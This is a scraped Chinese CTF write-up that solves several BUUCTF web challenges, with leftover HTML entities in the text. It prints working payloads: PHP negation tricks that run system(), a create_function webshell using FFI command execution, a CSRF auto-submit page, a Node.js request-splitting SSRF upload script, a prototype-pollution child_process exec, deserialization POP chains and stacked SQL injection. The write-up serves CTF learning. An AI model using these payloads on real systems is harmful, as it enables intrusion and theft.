12345var_dump(getallheaders());构造取反后：(~%89%9E%8D%A0%9B%8A%92%8F)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)());但是本题目需要构造无参数：利用[!%FF]或者[!%aa][~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()); 注意提交要通过bp 不然会编码： 然后构造：system(next(getallheaders())) 1234system(next(getallheaders()));(~%8C%86%8C%8B%9A%92)((~%91%9A%87%8B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()))[~%8C%86%8C%8B%9A%92][!%FF]([~%91%9A%87%8B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]())); [WEB]FighterFightsInvincibly直接view-source: 看到是动态代码执行，构造create_function代码注入，看下phpinfo： 1fighter&#x3D;create_function&amp;fights&#x3D;&amp;invincibly&#x3D;1;&#125;phpinfo();&#x2F;* 来个shell吧 1fighter&#x3D;create_function&amp;fights&#x3D;&amp;invincibly&#x3D;1;&#125;eval($_POST[V]);&#x2F;* 需要bypass，php版本7.4，利用php7.4 FFI实现用PHP代码调用C代码的方式执行命令。 蚁剑绕过利用失败，采取手动方式： flag读不全。其实还可以采用FFI调用PHP源码中的函数 12345678910# -*-coding:utf-8import requestsurl = &quot;http://daf3777d-58e5-4447-a849-b1a2ba7c1e9c.node3.buuoj.cn/&quot;#data = &#123;&quot;fighter&quot;: &quot;create_function&quot;, &quot;fights&quot;: &quot;&quot;, &quot;invincibly&quot;: &quot;1;&#125;phpinfo();/*&quot;&#125;#data = &#123;&quot;fighter&quot;: &quot;create_function&quot;, &quot;fights&quot;: &quot;&quot;, &quot;invincibly&quot;: &quot;&quot;&quot;1;&#125;$e=FFI::cdef(&quot;void *popen(char*,char*);\\\\nvoid pclose(void*);\\\\nint fgetc(void*);&quot;,&quot;libc.so.6&quot;);$o = $e-&gt;popen(&quot;/readflag&quot;,&quot;r&quot;);$d=&quot;&quot;;while(($c=$e-&gt;fgetc($o))!=-1)&#123;$d.=str_pad(strval(dechex($c)),2,&quot;0&quot;,0);&#125;$e-&gt;pclose($o);echo hex2bin($d);/*&quot;&quot;&quot;&#125;data = &#123;&quot;fighter&quot;: &quot;create_function&quot;, &quot;fights&quot;: &quot;&quot;, &quot;invincibly&quot;: &quot;&quot;&quot;&#125;$e=FFI::cdef(&quot;int php_exec(int type, char *cmd);&quot;);$e-&gt;php_exec(3,$_REQUEST[&#x27;cmd&#x27;]);/*&quot;&quot;&quot;&#125;res = requests.post(url, data=data,params=&#123;&quot;cmd&quot;: &quot;/readflag&quot;&#125;)print (res.content) [WEB]flagshop环境不太顺畅..中间重新起了好几次环境。。 这道题目考察的是CSRF，这种题目并不多，通过这个题目详细分析下这种漏洞。 先了解一下：CSRF 详解与攻防实战 首先进入环境注册登录： 需要足够的钱购买flag。看一下怎么获得足够的钱，发现其有一个转账功能，与上文CSRF讲解的例子不谋而合同样是转账操作，其次还存在一个提交报告的地方，思路很明显了，就是构造恶意的链接，然后在提交报告处提交恶意链接，这样管理员查看报告就会自动转账： 看到Longlone用户，应该是利用CSRF让其给注册的用户转账，利用burp构造CSRF的POC放在vps上： POC修改一下，加一个脚本自动提交的代码，放在vps上index.html，然后提交报告： 1234567891011121314151617&lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;head&gt; &lt;script&gt; window.onload = function() &#123; document.getElementById(&quot;postsubmit&quot;).click();&#125; &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;http://31a0d988-edec-4409-83c4-04e3545ef852.node3.buuoj.cn/transfer.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;target&quot; value=&quot;111&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;money&quot; value=&quot;9999999999999999&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;messages&quot; value=&quot;111&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 提交成功后返回首页查看余额，购买flag即可。 [WEB]greatphp代码审计： 12345678910111213141516171819202122232425&lt;?phperror_reporting(0);class SYCLOVER &#123; public $syc; public $lover; public function __wakeup()&#123; if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123; if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#x27;/&quot;, $this-&gt;syc, $match))&#123; eval($this-&gt;syc); &#125; else &#123; die(&quot;Try Hard !!&quot;); &#125; &#125; &#125;&#125;if (isset($_GET[&#x27;great&#x27;]))&#123; unserialize($_GET[&#x27;great&#x27;]);&#125; else &#123; highlight_file(__FILE__);&#125;?&gt; 反序列化题目，可以看到想要执行命令必须满足MD5 、sha1值相等，但是既满足相等又要执行命令难以绕过。这里有个考察点就是： md5/sha1函数对一个类进行处理的时候会触发这个类的__toString魔术方法 这里想到了利用原生类。利用Error 内置类，在进行处理的时候触发__toString ，先看一下类： 可见会输出payload 错误文件路径 以及行号，所以我们要想得到输出相同就需要在同一行： 可见这样就可以使的$a $b 相等，但是输出的报错信息相同。 接下来考虑怎么代码执行，首先我们需要控制整个代码块，利用?&gt;&lt;?php 形式，因为过滤了&lt;?php 采用短标签的形式&lt;?= ，其次过滤了小括号 因为控制了整个代码块，可以采取include flag文件的形式，过滤了”，无法利用 include &quot;/flag&quot; 利用取反绕过： 12输出报错信息：Error: ?&gt;&lt;?&#x3D;include &quot;&#x2F;flag&quot;?&gt;#先闭合拼接：eval(Error: ?&gt;&lt;?&#x3D;include &quot;&#x2F;flag&quot;?&gt;);#成功控制代码块 包含文件 payload： 1“?&gt;&lt;?&#x3D;include~”.urldeocde(%D0%99%93%9E%98).&quot;?&gt;&quot; exp： 12345678910111213&lt;?phpclass SYCLOVER &#123; public $syc; public $lover;&#125;$payload = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;$a = new Error($payload,1);$b = new Error($payload,2);$v = new SYCLOVER();$v-&gt;syc=$a;$v-&gt;lover=$b;#echo serialize($v); echo urlencode(serialize($v)); [WEB]cross待解决","categories":[{"name":"CTF","slug":"CTF","permalink":"https://v1sun.github.io/categories/CTF/"}],"tags":[{"name":"buuctf","slug":"buuctf","permalink":"https://v1sun.github.io/tags/buuctf/"},{"name":"Writeup","slug":"Writeup","permalink":"https://v1sun.github.io/tags/Writeup/"}]},{"title":"BUUCTF-GYCTF2020","slug":"BUUCTF-2019极客大挑战","date":"2021-04-19T13:10:00.000Z","updated":"2021-05-11T09:49:47.050Z","comments":true,"path":"2021/04/19/BUUCTF-2019极客大挑战/","link":"","permalink":"https://v1sun.github.io/2021/04/19/BUUCTF-2019%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/","excerpt":"","text":"BUUCTF-GYCTF2020[WEB]Node Game代码审计可以查看源码，代码审计： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128var express = require(&#x27;express&#x27;);var app = express();var fs = require(&#x27;fs&#x27;);var path = require(&#x27;path&#x27;);var http = require(&#x27;http&#x27;);var pug = require(&#x27;pug&#x27;);var morgan = require(&#x27;morgan&#x27;);const multer = require(&#x27;multer&#x27;);app.use(multer(&#123;dest: &#x27;./dist&#x27;&#125;).array(&#x27;file&#x27;));app.use(morgan(&#x27;short&#x27;));app.use(&quot;/uploads&quot;,express.static(path.join(__dirname, &#x27;/uploads&#x27;)))app.use(&quot;/template&quot;,express.static(path.join(__dirname, &#x27;/template&#x27;)))app.get(&#x27;/&#x27;, function(req, res) &#123; var action = req.query.action?req.query.action:&quot;index&quot;; if( action.includes(&quot;/&quot;) || action.includes(&quot;\\\\&quot;) )&#123; res.send(&quot;Errrrr, You have been Blocked&quot;); &#125; file = path.join(__dirname + &#x27;/template/&#x27;+ action +&#x27;.pug&#x27;); var html = pug.renderFile(file); res.send(html);&#125;);app.post(&#x27;/file_upload&#x27;, function(req, res)&#123; var ip = req.connection.remoteAddress; var obj = &#123; msg: &#x27;&#x27;, &#125; if (!ip.includes(&#x27;127.0.0.1&#x27;)) &#123; obj.msg=&quot;only admin&#x27;s ip can use it&quot; res.send(JSON.stringify(obj)); return &#125; fs.readFile(req.files[0].path, function(err, data)&#123; if(err)&#123; obj.msg = &#x27;upload failed&#x27;; res.send(JSON.stringify(obj)); &#125;else&#123; var file_path = &#x27;/uploads/&#x27; + req.files[0].mimetype +&quot;/&quot;; var file_name = req.files[0].originalname var dir_file = __dirname + file_path + file_name if(!fs.existsSync(__dirname + file_path))&#123; try &#123; fs.mkdirSync(__dirname + file_path) &#125; catch (error) &#123; obj.msg = &quot;file type error&quot;; res.send(JSON.stringify(obj)); return &#125; &#125; try &#123; fs.writeFileSync(dir_file,data) obj = &#123; msg: &#x27;upload success&#x27;, filename: file_path + file_name &#125; &#125; catch (error) &#123; obj.msg = &#x27;upload failed&#x27;; &#125; res.send(JSON.stringify(obj)); &#125; &#125;)&#125;)app.get(&#x27;/source&#x27;, function(req, res) &#123; res.sendFile(path.join(__dirname + &#x27;/template/source.txt&#x27;));&#125;);app.get(&#x27;/core&#x27;, function(req, res) &#123; var q = req.query.q; var resp = &quot;&quot;; if (q) &#123; var url = &#x27;http://localhost:8081/source?&#x27; + q console.log(url) var trigger = blacklist(url); if (trigger === true) &#123; res.send(&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;); &#125; else &#123; try &#123; http.get(url, function(resp) &#123; resp.setEncoding(&#x27;utf8&#x27;); resp.on(&#x27;error&#x27;, function(err) &#123; if (err.code === &quot;ECONNRESET&quot;) &#123; console.log(&quot;Timeout occurs&quot;); return; &#125; &#125;); resp.on(&#x27;data&#x27;, function(chunk) &#123; try &#123; resps = chunk.toString(); res.send(resps); &#125;catch (e) &#123; res.send(e.message); &#125; &#125;).on(&#x27;error&#x27;, (e) =&gt; &#123; res.send(e.message);&#125;); &#125;); &#125; catch (error) &#123; console.log(error); &#125; &#125; &#125; else &#123; res.send(&quot;search param &#x27;q&#x27; missing!&quot;); &#125;&#125;)function blacklist(url) &#123; var evilwords = [&quot;global&quot;, &quot;process&quot;,&quot;mainModule&quot;,&quot;require&quot;,&quot;root&quot;,&quot;child_process&quot;,&quot;exec&quot;,&quot;\\&quot;&quot;,&quot;&#x27;&quot;,&quot;!&quot;]; var arrayLen = evilwords.length; for (var i = 0; i &lt; arrayLen; i++) &#123; const trigger = url.includes(evilwords[i]); if (trigger === true) &#123; return true &#125; &#125;&#125;var server = app.listen(8081, function() &#123; var host = server.address().address var port = server.address().port console.log(&quot;Example app listening at http://%s:%s&quot;, host, port)&#125;) 通过审计发现存在以下功能： 1234&#39;&#x2F;&#39; &#x2F;&#x2F;indexpost &#x2F;file_upload &#x2F;&#x2F;文件上传get &#x2F;source &#x2F;&#x2F;查看源码get &#x2F;core &#x2F;&#x2F;存在SSRF 漏洞分析核心代码分析： get /core 存在SSRF，对我们传入的q参数进行拼接： 1url &#x3D; &#39;http:&#x2F;&#x2F;localhost:8081&#x2F;source?&#39; + q 然后通过blacklist函数进行验证，blacklist函数： 12345678910function blacklist(url) &#123; var evilwords = [&quot;global&quot;, &quot;process&quot;,&quot;mainModule&quot;,&quot;require&quot;,&quot;root&quot;,&quot;child_process&quot;,&quot;exec&quot;,&quot;\\&quot;&quot;,&quot;&#x27;&quot;,&quot;!&quot;]; var arrayLen = evilwords.length; for (var i = 0; i &lt; arrayLen; i++) &#123; const trigger = url.includes(evilwords[i]); if (trigger === true) &#123; return true &#125; &#125;&#125; 对敏感函数进行了过滤。 post /file_upload 是个文件上传的地方，需要满足以下条件： 1ip.includes(&#39;127.0.0.1&#39;) 首页还存在提示： 存在SSRF+nodejs 想到了http拆分攻击，Node 版本为 8.12.0，存在漏洞，因此可以利用上传功能。 提示了pug，同时模板渲染采用的是pug引擎： 看一下 pug 引擎文档： 从代码可以看到存在一个/template模板目录，存放着后缀为pug的模板文件，看下文档里边的包含语法，那么我们可以上传一个pug文件，pug文件里写入恶意的包含代码，包含我们要读的文件，在模板渲染的时候就会包含目标文件。 1234567//- index.pugdoctype htmlhtml head style include style.css 思路就很明显了，因为限制了本地上传我们利用nodejs 的SSRF构造一个post请求，上传pug文件，包含读取任意文件。 漏洞利用构造post请求，采用抓包的方法获取上传请求： 直接上传会提示： 构造exp：利用nodejs ssrf构造post请求 1234567891011121314151617181920212223242526272829303132333435363738394041#-*-coding:utf-8import urllib.parseimport requestspayload &#x3D; &#39;&#39;&#39; HTTP&#x2F;1.1Host: xConnection: keep-alivePOST &#x2F;file_upload HTTP&#x2F;1.1Host: xConnection: keep-aliveContent-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------303312354614442Content-Length: 317-----------------------------303312354614442Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;v1sun.pug&quot;Content-Type: &#x2F;..&#x2F;template&#x2F;&#x2F;- v1sun.pugdoctype htmlhtml head style include ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt -----------------------------303312354614442--GET &#x2F;flag HTTP&#x2F;1.1Host: xConnection: closex:&#39;&#39;&#39;payload &#x3D; payload.replace(&quot;\\n&quot;, &quot;\\r\\n&quot;)payload &#x3D; &#39;&#39;.join(chr(int(&#39;0xff&#39; + hex(ord(c))[2:].zfill(2), 16)) for c in payload)#print(payload)#print (urllib.parse.quote(payload))r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;1b1aa7a2-6ecd-4a57-b9de-5bbebae5c2a0.node3.buuoj.cn&#x2F;core?q&#x3D;&#39;+ urllib.parse.quote(payload))print(r.text) Content-Type处存在一个小trick，利用nodejs的目录穿越，上传到模板目录： 1Content-Type: &#x2F;..&#x2F;template 同时要修改：Connection: keep-alive 以至于让我们的所有请求包含进去 上传后访问：?action=v1sun 查看源码就得到flag [WEB]Ez_Express题目分析 但是ADMIN注册不了，利用TEST注册登录后查看源码：TEST 123456 下载源码 代码审计审计发现是nodejs：app.js 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950var createError = require(&#x27;http-errors&#x27;);var express = require(&#x27;express&#x27;);var path = require(&#x27;path&#x27;);var cookieParser = require(&#x27;cookie-parser&#x27;);var logger = require(&#x27;morgan&#x27;);const session = require(&#x27;express-session&#x27;)const randomize = require(&#x27;randomatic&#x27;)const bodyParser = require(&#x27;body-parser&#x27;)var indexRouter = require(&#x27;./routes/index&#x27;);var app = express();// view engine setupapp.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;));app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);app.disable(&#x27;etag&#x27;);app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())app.use(session(&#123; name: &#x27;session&#x27;, secret: randomize(&#x27;aA0&#x27;, 16), resave: false, saveUninitialized: false&#125;))app.use(logger(&#x27;dev&#x27;));app.use(express.json());app.use(express.urlencoded(&#123; extended: false &#125;));app.use(cookieParser());app.use(express.static(path.join(__dirname, &#x27;public&#x27;)));app.use(&#x27;/&#x27;, indexRouter);// catch 404 and forward to error handlerapp.use(function(req, res, next) &#123; next(createError(404));&#125;);// error handlerapp.use(function(err, req, res, next) &#123; // set locals, only providing error in development res.locals.message = err.message; res.locals.error = req.app.get(&#x27;env&#x27;) === &#x27;development&#x27; ? err : &#123;&#125;; // render the error page res.status(err.status || 500); res.render(&#x27;error&#x27;);&#125;);module.exports = app; app.js没什么特别关注的点。 index.js： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172var express = require(&#x27;express&#x27;);var router = express.Router();const isObject = obj =&gt; obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === Object;const merge = (a, b) =&gt; &#123; for (var attr in b) &#123; if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123; merge(a[attr], b[attr]); &#125; else &#123; a[attr] = b[attr]; &#125; &#125; return a&#125;const clone = (a) =&gt; &#123; return merge(&#123;&#125;, a);&#125;function safeKeyword(keyword) &#123; if(keyword.match(/(admin)/is)) &#123; return keyword &#125; return undefined&#125;router.get(&#x27;/&#x27;, function (req, res) &#123; if(!req.session.user)&#123; res.redirect(&#x27;/login&#x27;); &#125; res.outputFunctionName=undefined; res.render(&#x27;index&#x27;,data=&#123;&#x27;user&#x27;:req.session.user.user&#125;);&#125;);router.get(&#x27;/login&#x27;, function (req, res) &#123; res.render(&#x27;login&#x27;);&#125;);router.post(&#x27;/login&#x27;, function (req, res) &#123; if(req.body.Submit==&quot;register&quot;)&#123; if(safeKeyword(req.body.userid))&#123; res.end(&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125; req.session.user=&#123; &#x27;user&#x27;:req.body.userid.toUpperCase(), &#x27;passwd&#x27;: req.body.pwd, &#x27;isLogin&#x27;:false &#125; res.redirect(&#x27;/&#x27;); &#125; else if(req.body.Submit==&quot;login&quot;)&#123; if(!req.session.user)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125; if(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123; req.session.user.isLogin=true; &#125; else&#123; res.end(&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125; &#125; res.redirect(&#x27;/&#x27;); ;&#125;);router.post(&#x27;/action&#x27;, function (req, res) &#123; if(req.session.user.user!=&quot;ADMIN&quot;)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125; req.session.user.data = clone(req.body); res.end(&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;); &#125;);router.get(&#x27;/info&#x27;, function (req, res) &#123; res.render(&#x27;index&#x27;,data=&#123;&#x27;user&#x27;:res.outputFunctionName&#125;);&#125;)module.exports = router; 看到了js原型链污染漏洞的标志性函数：merge 应该就是原型链污染了。 但是看到： ADMIN用户才可以触发clone 进而利用merge。但是限制了admin注册，看下注册登陆处： 注册处会有验证，但是后边写入session的时候会经过toUpperCase()函数的处理，不由得想到了nodejs的大小写转换特性： 对于toUpperCase(): 1字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot; 对于toLowerCase(): 1字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K) 在绕一些规则的时候就可以利用这几个特殊字符进行绕过 漏洞利用可见我们要想得到ADMIN 可以注册admın 经过处理就得到ADMIN： 成功登陆。接下来就是原型链污染，首先寻找污染参数，看到存在outputFunctionName，并且res.outputFunctionName=undefined;在index页面渲染，那么可以构造payload污染参数，通过info页面触发，因为不能回显，可以反弹shell或者写入到一个文件内然后访问： 12Content-Type: application&#x2F;json&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;: &quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;cat &#x2F;flag &gt; &#x2F;app&#x2F;public&#x2F;flag&#39;);var _tmp2&quot;&#125;&#125; 路径通过报错得到： 然后访问/flag 得到flag。 [WEB]Easyphp题目分析扫描目录发现： 存在备份文件，下载代码审计： admin 进入update页面 可得到flag 查看是否存在注入： 存在预处理，因此无法注入 查询的sql语句为： 1select id,password from user where username&#x3D;? 查询admin用户的密码，密码和数据库相等则登陆成功。 通过控制执行的语句即可绕过登录admin： 12select id,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;? &#x2F;&#x2F;&quot;202cb962ac59075b964b07152d234b70&quot;为123的MD5，密码输入123即可 接下来就是利用反序列化漏洞，构造pop链去执行sql语句： 1UpdateHelper类在结束时 会echo 调用魔术方法 1触发User的__toString()方法 1调用Info的__call()方法 1__call 方法调用了login 这里可以： 12$this-&gt;CtrlCase 为dbCtrl类login参数为：$this-&gt;age传进来的 pop 链： 1UpdateHelper::__destruct()-&gt;User::__toString()-&gt;Info::__call-&gt;dbCtrl::login 1O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125; 寻找反序列化入口： update页面会调用update方法： 可见$_POST[&#39;age&#39;]与$_POST[&#39;nickname&#39;]可控，传入Info类实例化，然后反序列化，再经过safe函数处理。 可见如果我们直接传入payload，那么payload不会被识别为对象，而是字符串，但是这里我们看到了典型的反序列化字符串逃逸的形式，可以利用字符串逃逸： 可见是一个字符增加的字符串逃逸。 漏洞利用Info()类正常序列化： 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:7:&quot;testage&quot;;s:8:&quot;nickname&quot;;s:8:&quot;testname&quot;;s:8:&quot;CtrlCase&quot;;N;&#125; 当把我们把payload作为nickname值传进去，为了拼接闭合，对payload改一下： 1&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;&#125; 即把payload当做Info()类正常序列化的N值，最后加}闭合，序列化之后： 1O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:265:&quot;&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;&#125;&quot;;&#125; 可见要让我们的payload逃逸出来，必须多出265个字符，一个字符用一个union 替换为hacker，可见需要265个union，即nickname为： 1unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;&#125; 序列化一下并用safe函数处理： 1O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:1590:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;&#125;&quot;;&#125; 可见可以逃逸出来，因此payload： 1age&#x3D;1&amp;nickname&#x3D;unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;&#125; 登录页面 用户名admin 密码任意： [WEB]Blacklist题目分析首先查询，发现和强网杯的很像 因此尝试堆叠注入，过滤字符： 因此无法改名，也无法用预处理语句。 通过查资料 发现可以利用handler语句 可见flag在FlagHere表 Getflag构造语句查一下第一行数据： 123通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。 通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。 通过HANDLER tbl_name 